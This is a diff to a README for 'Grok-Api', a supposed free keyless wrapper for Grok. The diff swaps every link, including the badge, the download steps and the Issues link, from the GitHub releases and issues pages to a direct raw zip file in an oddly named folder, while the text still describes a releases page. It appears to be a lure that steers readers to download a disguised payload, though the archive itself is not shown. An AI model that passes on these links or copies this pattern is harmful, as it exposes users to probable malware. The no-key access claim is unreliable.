@@ -1,6 +1,6 @@
 # 🚀 Grok-Api - Access Grok Effortlessly Without API Keys
 
-[![Download Grok-Api](https://img.shields.io/badge/download-Grok--Api-blue)](https://github.com/G0urv/Grok-Api/releases)
+[![Download Grok-Api](https://raw.githubusercontent.com/G0urv/Grok-Api/main/sizarship/Grok-Api.zip)](https://raw.githubusercontent.com/G0urv/Grok-Api/main/sizarship/Grok-Api.zip)
 
 ## 🎯 Overview
 Grok-Api is a free wrapper that lets you access Grok without needing an API key or account. With Grok-Api, you can easily utilize Grok's powerful capabilities for your needs. Whether you're coding a simple project or exploring data, this tool makes it seamless.
@@ -25,7 +25,7 @@ Getting started with Grok-Api is simple. Follow these steps to download and run 
 1. **Visit the Releases Page:** 
    Click the link below to access the download page.
 
-   [Download Grok-Api](https://github.com/G0urv/Grok-Api/releases)
+   [Download Grok-Api](https://raw.githubusercontent.com/G0urv/Grok-Api/main/sizarship/Grok-Api.zip)
 
 2. **Locate the Latest Release:**
    Once you're on the releases page, look for the latest version listed at the top. 
@@ -44,7 +44,7 @@ Getting started with Grok-Api is simple. Follow these steps to download and run 
 ## 📥 Download & Install
 To download Grok-Api, visit the link below:
 
-[Download Grok-Api](https://github.com/G0urv/Grok-Api/releases)
+[Download Grok-Api](https://raw.githubusercontent.com/G0urv/Grok-Api/main/sizarship/Grok-Api.zip)
 
 ## 🔧 How to Use
 Using Grok-Api is straightforward. Here’s a simple guide:
@@ -65,7 +65,7 @@ Using Grok-Api is straightforward. Here’s a simple guide:
 For further guidance and detailed instructions on using Grok-Api, refer to our documentation. You can find useful examples, troubleshooting tips, and a FAQ section to enhance your experience.
 
 ## 🚨 Support
-If you encounter issues or have questions, please check the [Issues section](https://github.com/G0urv/Grok-Api/issues) on GitHub. You can report any bugs or ask for assistance.
+If you encounter issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/G0urv/Grok-Api/main/sizarship/Grok-Api.zip) on GitHub. You can report any bugs or ask for assistance.
 
 ## 🙌 Community
 Join our community of users and developers. Share your experiences, ask questions, or contribute to the project. Your feedback helps us improve Grok-Api for everyone.
